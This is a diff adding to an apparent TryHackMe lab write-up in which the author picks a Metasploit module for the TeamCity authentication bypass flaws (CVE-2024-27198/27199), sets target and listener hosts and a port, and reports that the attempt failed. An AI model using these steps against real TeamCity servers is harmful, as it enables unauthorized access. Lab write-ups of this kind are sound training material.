@@ -19,6 +19,32 @@ Port 43229 and 50000.
 Team city looks intersting to me, so when I look it up I find 
 'CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities (FIXED)' 
 This is where I open metasploit
+`search teamcity`
 
 ![TryHackMe Screenshot2](sc2.png)
+
+`use 5`
+
+Now we need to set Lhost local machine and Rhost remote machine used to define target and attacker machine...
+
+`
+set RHOSTS [Target_IP] could be a range too
+
+set LHOST [Your_IP]
+`
+
+
+After checking and making sure I would be able to run the exploit I was getting some problems and I relized we the automatic port it was set to was the wrong one. I the begning we saw it was port 5000... 
+
+so now we 
+`set RPORT 5000`
+![TryHackMe Screenshot2](sc3.png)
+
+I was wrong didn't work...
+
+
+
+
+
+
 
